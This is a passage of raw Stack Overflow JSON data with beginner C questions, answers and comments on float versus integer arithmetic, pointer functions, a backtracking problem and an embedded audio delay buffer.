"https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 4, "last_activity_date": 1499183634, "creation_date": 1499183634, "answer_id": 44910117, "question_id": 44910085, "link": "https://stackoverflow.com/questions/44910085/changing-int-with-float/44910117#44910117", "title": "Changing INT with FLOAT", "body": "<p>It <em>would</em> work if you changed the <em>type</em> of <code>sum</code> to a <code>float</code> or <code>double</code>, <em>but</em> you'd also need to change the format specifier in your <code>printf</code> call. Use <code>%f</code> to output a <code>float</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 446, "user_id": 6468373, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/7icdi.jpg?s=128&g=1", "display_name": "An intern has no name", "link": "https://stackoverflow.com/users/6468373/an-intern-has-no-name"}, "edited": false, "score": 1, "creation_date": 1499183898, "post_id": 44910172, "comment_id": 76796935, "body": "You beat me to it, Bathsheba."}], "tags": [], "owner": {"reputation": 446, "user_id": 6468373, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/7icdi.jpg?s=128&g=1", "display_name": "An intern has no name", "link": "https://stackoverflow.com/users/6468373/an-intern-has-no-name"}, "is_accepted": false, "score": 1, "last_activity_date": 1499183822, "creation_date": 1499183822, "answer_id": 44910172, "question_id": 44910085, "link": "https://stackoverflow.com/questions/44910085/changing-int-with-float/44910172#44910172", "title": "Changing INT with FLOAT", "body": "<p>That's because you are printing a %d for sum in the end, which is used for int types. If you want the float to be printed correctly, you have to use %f.</p>\n"}], "owner": {"reputation": 9, "user_id": 8232558, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e5d8c81f952d1da6db063de6f126122?s=128&d=identicon&r=PG&f=1", "display_name": "Pietro Dimichele", "link": "https://stackoverflow.com/users/8232558/pietro-dimichele"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1499184949, "creation_date": 1499183507, "last_edit_date": 1499184949, "question_id": 44910085, "link": "https://stackoverflow.com/questions/44910085/changing-int-with-float", "title": "Changing INT with FLOAT", "body": "<p>I have this program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;conio.h&gt;\n\n#define n 3\n#define m 3\n\nint main(void)\n{\nint i;\nint j;\nint mat[n][m];\nint sum = 0;\n\nfor (i = 0; i &lt; n; i++)\n{\n    for (j = 0; j &lt; m; j++)\n    {\n        printf(\"Enters the matrix values[%d][%d]: \", i, j);\n        scanf(\"%d\", &amp;mat[i][j]);\n    }\n}\n\nfor (i = 0; i &lt; n; i++)\n{\n    for (j = 0; j &lt; m; j++)\n    {\n        sum = sum + mat[i][j];\n    }\n}\n\nprintf(\"the sum of all elements of matrix is: %d\\n\", sum);\n\nfor (i = 0; i &lt; n; i++)\n{\n    sum = 0;\n    for (j = 0; j &lt; m; j++)\n    {\n        sum = sum + mat[i][j];\n    }\n    sum = sum / m;\n    printf(\"The average of the i-th line is %d e': %d\\n\", i, sum);\n}\ngetch();\n}\n</code></pre>\n\n<p>This program works but if the result of sum is an odd number, the average of i-th line is approximated by default.</p>\n\n<p>For solving it I have changed \"int summ\" with \"float summ\" but it doesn't work.</p>\n\n<p>Can Someone help me please?</p>\n"}, {"tags": ["c", "function", "difference"], "comments": [{"owner": {"reputation": 1007, "user_id": 5863987, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/z7wZz.png?s=128&g=1", "display_name": "NieDzejkob", "link": "https://stackoverflow.com/users/5863987/niedzejkob"}, "edited": false, "score": 3, "creation_date": 1499182305, "post_id": 44909739, "comment_id": 76796011, "body": "The problem is that the second calculations uses the new value of a. I would suggest doing <code>*b = -*a;</code>, because of how math works."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1499182306, "post_id": 44909739, "comment_id": 76796013, "body": "<code>which takes two generic floats</code>...1) what is a generic float? 2) a pointer != scalar variable."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1499182564, "post_id": 44909739, "comment_id": 76796170, "body": "Another problem is that your <code>diff_abs</code> function is supposed to return a <code>float</code> value, but it doesn&#39;t actually return anything."}], "answers": [{"tags": [], "owner": {"reputation": 2146, "user_id": 8231181, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PJgPD.jpg?s=128&g=1", "display_name": "Rayhane Mama", "link": "https://stackoverflow.com/users/8231181/rayhane-mama"}, "is_accepted": false, "score": 1, "last_activity_date": 1499183581, "last_edit_date": 1499183581, "creation_date": 1499182771, "answer_id": 44909892, "question_id": 44909739, "link": "https://stackoverflow.com/questions/44909739/c-function-which-takes-2-floats-and-returns-their-difference-after-the-block-u/44909892#44909892", "title": "C - Function which takes 2 floats and returns their difference after the block using pointers", "body": "<p>First, you are changing <code>a</code> value then using it to the next calculation so simplify change your function to:</p>\n\n<pre><code>void diff_abs (float *a, float *b) {\n    *a= *a-*b;\n    *b = -*a\n}\n</code></pre>\n\n<p>Second, since you can't return multiple variables in a <code>C</code> function, one of the solution is to use <code>void</code> returning function but change variables while using pointers (like you're somehow doing)</p>\n\n<p>Finally, since your function returns <code>void</code> you can't use it as <code>floats</code> in the <code>printf</code> function so just use <code>c</code> and <code>d</code></p>\n\n<p>like this:</p>\n\n<pre><code>printf(\"%.2f\\n%.2f\",c,d);\n</code></pre>\n\n<p>of course don't forget to call:</p>\n\n<pre><code>diff_abs(&amp;c, &amp;d)\n</code></pre>\n\n<p>before trying to print</p>\n\n<p>you can refer to this <a href=\"https://stackoverflow.com/questions/2620146/how-do-i-return-multiple-values-from-a-function-in-c\">topic</a> for returning multiple variables in C</p>\n"}], "owner": {"reputation": 11, "user_id": 8254660, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211234775918215/picture?type=large", "display_name": "Giorgia Carboni", "link": "https://stackoverflow.com/users/8254660/giorgia-carboni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1499183581, "creation_date": 1499182199, "question_id": 44909739, "link": "https://stackoverflow.com/questions/44909739/c-function-which-takes-2-floats-and-returns-their-difference-after-the-block-u", "title": "C - Function which takes 2 floats and returns their difference after the block using pointers", "body": "<p>I'm trying to write a function which takes two generic floats (make it 'a' and 'b') and returns their difference assigned to the variables, so a=a-b and b=b-a.\nIt should print the values with 2 decimal places and it must work after I exit the block... What is wrong with my code?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nfloat diff_abs (float *a, float *b) {\n*a= *a-*b;\n*b= *b-*a;\n}\n\nint main(void) {\n    float c, d;\n    scanf(\"%f\", &amp;c);\n    scanf(\"%f\", &amp;d);\nprintf(\"%.2f\\n%.2f\", diff_abs(&amp;c, &amp;d));\nreturn 0;   \n}\n</code></pre>\n\n<p>I would appreciate your suggestions, thank you.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1499182203, "post_id": 44909715, "comment_id": 76795943, "body": "I don&#39;t understand the problem description and the examples."}, {"owner": {"reputation": 1648, "user_id": 4620387, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/8e3a06c1e1f8e1b1b4e3c8a6651be2b4?s=128&d=identicon&r=PG&f=1", "display_name": "Sam12", "link": "https://stackoverflow.com/users/4620387/sam12"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499182424, "post_id": 44909715, "comment_id": 76796084, "body": "For example in this series a:[11,8,9]  a[1]-a[0]&lt;0 and a[2]-a[1]&gt;0 .In other words the sign of the difference between each neighbor changes."}, {"owner": {"reputation": 1648, "user_id": 4620387, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/8e3a06c1e1f8e1b1b4e3c8a6651be2b4?s=128&d=identicon&r=PG&f=1", "display_name": "Sam12", "link": "https://stackoverflow.com/users/4620387/sam12"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499182603, "post_id": 44909715, "comment_id": 76796190, "body": "Better?@EugeneSh."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499182673, "post_id": 44909715, "comment_id": 76796233, "body": "Yes, a bit clearer."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1499189490, "post_id": 44909715, "comment_id": 76799422, "body": "What if a certain difference is zero?"}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1499196451, "post_id": 44909715, "comment_id": 76802190, "body": "And do you have to use C necessarily? Working with containers like List in C++ or Java will make it so much easier"}], "answers": [{"comments": [{"owner": {"reputation": 1648, "user_id": 4620387, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/8e3a06c1e1f8e1b1b4e3c8a6651be2b4?s=128&d=identicon&r=PG&f=1", "display_name": "Sam12", "link": "https://stackoverflow.com/users/4620387/sam12"}, "edited": false, "score": 0, "creation_date": 1499197893, "post_id": 44913032, "comment_id": 76802782, "body": "How do I know when to stop it?"}, {"owner": {"reputation": 1600, "user_id": 7292819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/986e6709d8b360153849def9dcf8fea8?s=128&d=identicon&r=PG&f=1", "display_name": "Gary99", "link": "https://stackoverflow.com/users/7292819/gary99"}, "edited": false, "score": 0, "creation_date": 1499212531, "post_id": 44913032, "comment_id": 76806843, "body": "Welcome to Stack Overflow.  This answer might be a little clearer if you made it a description along with a few lines of code ."}], "tags": [], "owner": {"reputation": 1, "user_id": 3192327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c2d652022de450b65a2165a9a371896?s=128&d=identicon&r=PG&f=1", "display_name": "zahi.essa", "link": "https://stackoverflow.com/users/3192327/zahi-essa"}, "is_accepted": false, "score": 0, "last_activity_date": 1499196694, "creation_date": 1499196694, "answer_id": 44913032, "question_id": 44909715, "link": "https://stackoverflow.com/questions/44909715/subset-using-backtracking/44913032#44913032", "title": "Subset using Backtracking", "body": "<p>you can send a pointer that saves the max in the recursive function , and every time you reach the if(n==0) you have to check if the count_ones bigger than max then max=count_ones </p>\n"}], "owner": {"reputation": 1648, "user_id": 4620387, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/8e3a06c1e1f8e1b1b4e3c8a6651be2b4?s=128&d=identicon&r=PG&f=1", "display_name": "Sam12", "link": "https://stackoverflow.com/users/4620387/sam12"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1499197966, "creation_date": 1499182121, "last_edit_date": 1499197966, "question_id": 44909715, "link": "https://stackoverflow.com/questions/44909715/subset-using-backtracking", "title": "Subset using Backtracking", "body": "<p>The following question I was asked to solve using backtracking:\nIt's supposed to return the length of the longest subset of differences that replaces a sign.\nFor example:\nfor this given series [11,6,7,8,9] it returns 3.\nbecause it includes this subset [11,8,9] and [11,6,8] .</p>\n\n<p>*In this series a:[11,8,9] a[1]-a[0]&lt;0 and a[2]-a[1]>0 .In other words the sign of the difference between each neighbor changes. *</p>\n\n<p>I pretty much finished the coding but have no idea how to return the max length using backtracking.</p>\n\n<p>Any note/help will be highly appreciated.</p>\n\n<pre><code>/* this function checks if we can add another number to the sequence\n   and still the differences between the numbers replace a sign.It's enough\n   to check the last two*/\nint check_rec(int series[],int arr[],int n)\n{ int count=0,c=n;\n  int temp1=0,temp2=0;\n    while(c&gt;=0 &amp;&amp; count!=2)\n    {\n        if (arr[c]==1 &amp;&amp; count==0)\n        { temp1=series[c];\n          count++;\n        }\n        if (arr[c]==1 &amp;&amp; count==1 )\n        { temp1=series[c];\n          count++;\n        }\n        c--;\n    }\n    if(count&lt;2) return 1;\n    if(temp1&gt;temp2 &amp;&amp; series[n+1] &lt; temp1) return 1;\n    if(temp1&lt;temp2 &amp;&amp; series[n+1]&gt; temp1) return 1;\n    return 0;\n}\n\nint count_ones(int arr[],int n)\n{   int c;\n    for(int i=0;i&lt;n;i++)\n    {\n        if(arr[i])\n            c++;\n    }\n    return c;\n}\n    // 1 in the array helper indicates that the index has been chosen.\n    void max_crazy(int series[], int n,int helper[],int length,int max[])\n{\n    if(n==0)\n         {\n            int x=count_ones(helper,n);\n            if(x&gt;max[0])\n                max[0]=x;\n             }\n    for(int i=0;i&lt;2;i++)\n    {\n        if(n!=length &amp;&amp; i==1 &amp;&amp; !check_rec(series,helper,length-n))\n           continue;\n\n        helper[0]=i;\n        max_crazy(series,n-1,helper+1,length,max);\n    }\n\n}\n</code></pre>\n"}, {"tags": ["c", "audio", "hardware", "audio-recording", "nios"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499179739, "post_id": 44908931, "comment_id": 76794421, "body": "I am pretty sure your code should overflow the stack..."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 3, "creation_date": 1499179884, "post_id": 44908931, "comment_id": 76794526, "body": "<code>short *buff[48000];</code> --&gt; <code>short buff[48000];</code> ?"}, {"owner": {"reputation": 1357, "user_id": 773102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/St5U2.gif?s=128&g=1", "display_name": "Jonny Schubert", "link": "https://stackoverflow.com/users/773102/jonny-schubert"}, "edited": false, "score": 0, "creation_date": 1499179917, "post_id": 44908931, "comment_id": 76794550, "body": "I recommend to use static short buff[48000]. Also please use a for loop!"}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 0, "creation_date": 1499179926, "post_id": 44908931, "comment_id": 76794555, "body": "You made <code>buff</code> an array of (uninitialized) pointers. I&#39;m guessing that you want it to be an array of <code>short</code>s instead. I&#39;m surprised you get any results other than a crash or an infinite loop."}, {"owner": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 2, "creation_date": 1499179998, "post_id": 44908931, "comment_id": 76794599, "body": "You also have to change <code>*buff[i]= *au_in</code> to <code>buff[i]= *au_in</code>. And compile with <code>-Wall</code> so your compiler can report errors properly"}, {"owner": {"reputation": 21, "user_id": 6756501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e9d4f80b7d4a5d4a2ac62e10549ba5b?s=128&d=identicon&r=PG&f=1", "display_name": "Ironlord", "link": "https://stackoverflow.com/users/6756501/ironlord"}, "edited": false, "score": 0, "creation_date": 1499180427, "post_id": 44908931, "comment_id": 76794874, "body": "When I use the pointer stack I hear the audio. When I use the pointer stack and apply this change &quot;buff[i]= *au_in&quot; then  I heard a second of audio and nothing after all. When I use the short stack, I don&#39;t get any sound at all."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499181097, "post_id": 44908931, "comment_id": 76795286, "body": "You can&#39;t just trial &amp; error this, you need to actually know what you are doing. Creating an array of pointers doesn&#39;t make any sense at all, regardless of your results."}], "answers": [{"comments": [{"owner": {"reputation": 1357, "user_id": 773102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/St5U2.gif?s=128&g=1", "display_name": "Jonny Schubert", "link": "https://stackoverflow.com/users/773102/jonny-schubert"}, "edited": false, "score": 0, "creation_date": 1499181028, "post_id": 44909254, "comment_id": 76795240, "body": "Are you sure with this line: *(samp_rdy + 0x3) == 0x01. You are checking if memory at 0x0081033 is 0x01."}, {"owner": {"reputation": 21, "user_id": 6756501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e9d4f80b7d4a5d4a2ac62e10549ba5b?s=128&d=identicon&r=PG&f=1", "display_name": "Ironlord", "link": "https://stackoverflow.com/users/6756501/ironlord"}, "edited": false, "score": 0, "creation_date": 1499181628, "post_id": 44909254, "comment_id": 76795610, "body": "You have helped me a lot. The for loop is not compatible with my project, but now it works perfect.  Your code increments the i even if there isn&#39;t a new sample, so it introduces a lot of noise. Using my while loop I only increment the index when there is a new sample.  Thank you very much for your time.  Also, I&#39;m sure with *(samp_rdy + 0x3) == 0x01. The hardware (audio codec) is writing there if there is a new sample. So when I know i have a new one, I write it to &#39;0&#39;. Every time a new sample arrives, the codec modifies the value to &#39;1&#39;."}, {"owner": {"reputation": 1357, "user_id": 773102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/St5U2.gif?s=128&g=1", "display_name": "Jonny Schubert", "link": "https://stackoverflow.com/users/773102/jonny-schubert"}, "reply_to_user": {"reputation": 21, "user_id": 6756501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e9d4f80b7d4a5d4a2ac62e10549ba5b?s=128&d=identicon&r=PG&f=1", "display_name": "Ironlord", "link": "https://stackoverflow.com/users/6756501/ironlord"}, "edited": false, "score": 1, "creation_date": 1499181900, "post_id": 44909254, "comment_id": 76795768, "body": "Yes that&#39;s why I corrected my answer. Would be nice to get a reason for the downvotes."}], "tags": [], "owner": {"reputation": 1357, "user_id": 773102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/St5U2.gif?s=128&g=1", "display_name": "Jonny Schubert", "link": "https://stackoverflow.com/users/773102/jonny-schubert"}, "is_accepted": true, "score": -1, "last_activity_date": 1499181704, "last_edit_date": 1499181704, "creation_date": 1499180557, "answer_id": 44909254, "question_id": 44908931, "link": "https://stackoverflow.com/questions/44908931/saving-memory-address-content-in-c-array/44909254#44909254", "title": "Saving memory address content in C Array", "body": "<p>Try to run with C99 mode:</p>\n\n<pre><code>#define au_in (volatile short *) 0x0081050  //Input memory address\n#define au_out (volatile short *) 0x0081040\n#define samp_rdy (volatile int *) 0x0081030 //Indicates if a new sample is ready\n#define SAMPLE_BUF_SIZE     (48000)\n\n\nvoid main()\n{\n    static short buff[SAMPLE_BUF_SIZE];\n    for(int i = 0; i &lt; SAMPLE_BUF_SIZE; )\n    {\n        if(*(samp_rdy + 0x3)) //If there's a new sample\n        {\n            buff[i]= *au_in;\n            *(samp_rdy + 0x3)= 0;\n            i++;\n        }\n    }\n\n    while (1)\n    {\n        for(int i = 0; i &lt; SAMPLE_BUF_SIZE; )\n        {\n            if(*(samp_rdy + 0x3)) //If there's a new sample\n            {\n                *au_out = buff[i] + (*au_in);   //Reproduces actual sample + delayed sample\n                buff[i] = *au_in;               //replaces the sample in the array for the new one\n                *(samp_rdy + 0x3)= 0;\n                i++;\n            }\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 6756501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e9d4f80b7d4a5d4a2ac62e10549ba5b?s=128&d=identicon&r=PG&f=1", "display_name": "Ironlord", "link": "https://stackoverflow.com/users/6756501/ironlord"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 97, "favorite_count": 0, "accepted_answer_id": 44909254, "answer_count": 1, "score": 0, "last_activity_date": 1499188873, "creation_date": 1499179637, "last_edit_date": 1499188873, "question_id": 44908931, "link": "https://stackoverflow.com/questions/44908931/saving-memory-address-content-in-c-array", "title": "Saving memory address content in C Array", "body": "<p>I'm implementing a delay in C code for audio.\nI have a memory address where I receive the audio sample. And another memory address which indicates where a new sample appears.</p>\n\n<p>What I am trying to do is record the first audio second (48000 samples). In order to do so I'm declaring an array where I save the audio samples.</p>\n\n<p>In the main loop I make a sum of the actual sample and the delayed (1 second ago) sample, it's quite similar to an echo what I want to achieve.</p>\n\n<p>The problem is that my code reproduces the actual sound, but not the delayed, in fact, I can heard a little noise every second, so I guess it only reads the first sample of the array, and the rest is empty.</p>\n\n<p>I have analyzed my code, but I don't know where my failure is. I think it may be related with memory allocation, but I'm not very familiarized with C language. Could you please help me?</p>\n\n<pre><code>#define au_in (volatile short *) 0x0081050  //Input memory address\n#define au_out (volatile short *) 0x0081040\n#define samp_rdy (volatile int *) 0x0081030 //Indicates if a new sample is ready\n\n/* REPLAY */\nvoid main(){\n    short *buff[48000];\n    int i=0;\n    while(i&lt;48000){\n        if((*(samp_rdy + 0x3)==0x1)){ //If there's a new sample\n            *buff[i]= *au_in;\n            i++;\n            *(samp_rdy + 0x3)=0x0;\n        }\n    }\n\n    while (1){\n        i=0;\n        while(i&lt;48000){\n            if((*(samp_rdy + 0x3)==0x1)){\n                *au_out = *buff[i]+(*au_in); //Reproduces actual sample + delayed sample\n                *buff[i]=*au_in; //replaces the sample in the array for the new one\n                i++;\n                *(samp_rdy + 0x3)=0x0;\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>Thanks.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1499172651, "post_id": 44906484, "comment_id": 76789930, "body": "<code>sum1&#47;n</code> takes place in <i>integer arithmetic</i>. Google it. Lots of duplicates on this, once you know the search term."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2672107"}, "edited": false, "score": 1, "creation_date": 1499172699, "post_id": 44906484, "comment_id": 76789966, "body": "Why do you use the C++ tag?"}, {"owner": {"reputation": 1755, "user_id": 5986881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7a607dd49a0116e3ba869a66d6fd1ba0?s=128&d=identicon&r=PG", "display_name": "Samer Tufail", "link": "https://stackoverflow.com/users/5986881/samer-tufail"}, "edited": false, "score": 0, "creation_date": 1499172724, "post_id": 44906484, "comment_id": 76789996, "body": "&quot;percentage&quot; .."}, {"owner": {"reputation": 97, "user_id": 7698651, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/4079f7286b1dd89813e917007550a7ac?s=128&d=identicon&r=PG&f=1", "display_name": "anku", "link": "https://stackoverflow.com/users/7698651/anku"}, "edited": false, "score": 0, "creation_date": 1499172758, "post_id": 44906484, "comment_id": 76790025, "body": "@manni66 because syntax of c and c++ is almost similar."}, {"owner": {"reputation": 558, "user_id": 2410466, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/867a17b98e562c9419794266494e4f47?s=128&d=identicon&r=PG", "display_name": "Ramakanth Putta", "link": "https://stackoverflow.com/users/2410466/ramakanth-putta"}, "edited": false, "score": 0, "creation_date": 1499172791, "post_id": 44906484, "comment_id": 76790048, "body": "you need to a floating point arithmetic to get the actual percentages."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1499172800, "post_id": 44906484, "comment_id": 76790052, "body": "Why <code>#include &lt;math.h&gt;</code>? Also, C and C++ are not at all the same language."}, {"owner": {"reputation": 1435, "user_id": 8113019, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e1b7cb4133be670ac94023c9fcc6816?s=128&d=identicon&r=PG&f=1", "display_name": "Marek Vitek", "link": "https://stackoverflow.com/users/8113019/marek-vitek"}, "edited": false, "score": 0, "creation_date": 1499172859, "post_id": 44906484, "comment_id": 76790099, "body": "@manni66 Because that&#39;s how it is often presented in mainstream - C/C++ And maybe he doesn&#39;t even know the difference yet."}, {"owner": {"reputation": 97, "user_id": 7698651, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/4079f7286b1dd89813e917007550a7ac?s=128&d=identicon&r=PG&f=1", "display_name": "anku", "link": "https://stackoverflow.com/users/7698651/anku"}, "edited": false, "score": 0, "creation_date": 1499172944, "post_id": 44906484, "comment_id": 76790173, "body": "yes, i just started coding.i hardly know the difference.lol"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2672107"}, "edited": false, "score": 1, "creation_date": 1499173006, "post_id": 44906484, "comment_id": 76790223, "body": "@anku: no, C and C++ are distinct languages."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1499173033, "post_id": 44906484, "comment_id": 76790247, "body": "Note that code should be checking the return value from the call to <code>scanf()</code> (returns the number of successful assignments). What happens if the user enters non-numeric or otherwise malformed input?"}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1499178674, "post_id": 44906484, "comment_id": 76793761, "body": "Always (*) prefer <code>double</code> when using floating-point values. <i>(* yes, always)</i>"}], "answers": [{"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1499173134, "post_id": 44906637, "comment_id": 76790321, "body": "To explain: by using the floating point value <code>1.0</code>, the compiler is now forced to do all calaculations here in floating point arithmetic. A more clear way would be: <code>sum1&#47;(double)n; </code>"}], "tags": [], "owner": {"reputation": 558, "user_id": 2410466, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/867a17b98e562c9419794266494e4f47?s=128&d=identicon&r=PG", "display_name": "Ramakanth Putta", "link": "https://stackoverflow.com/users/2410466/ramakanth-putta"}, "is_accepted": false, "score": 0, "last_activity_date": 1499172885, "creation_date": 1499172885, "answer_id": 44906637, "question_id": 44906484, "link": "https://stackoverflow.com/questions/44906484/c-program-to-find-average/44906637#44906637", "title": "c program to find average", "body": "<p>Do floating point arithmetic like this</p>\n\n<pre><code>per1=sum1/(1.0*n); \nper2=sum2/(1.0*n);\nper3=sum3/(1.0*n);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": 